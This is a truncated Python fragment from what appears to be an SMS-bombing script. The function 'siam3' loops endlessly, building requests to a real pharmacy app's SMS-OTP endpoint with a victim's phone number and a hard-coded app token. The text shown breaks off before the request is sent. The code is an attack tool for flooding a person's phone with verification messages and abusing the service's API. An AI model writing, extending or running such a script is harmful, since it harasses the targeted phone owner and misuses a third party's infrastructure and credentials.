...
def siam3(number):
    try:
        while True:
            url_siam3 = "https://api.arogga.com/v1/auth/sms/send?f=app&v=5.0.4&os=android&osv=23"
            headers_siam3 = {'Content-Type': 'application/x-www-form-urlencoded'}
            data_siam3 = 'mobile=' + number + '&fcmToken=cXq7e97WRwOuQX8XhVhlki%253AAPA91bEzBAc1c502C0VfVmevconD7Tj55kXalhB6PZI8L7wDqua6mPKrwmMpczPXbDGucL6xUZsAlrnQluFpWbHNp9FnLaw9q0mWA2X0-vhWHRTsP1VfLGWJm_t3ZUzlXIBJ728wg_wA&referral='
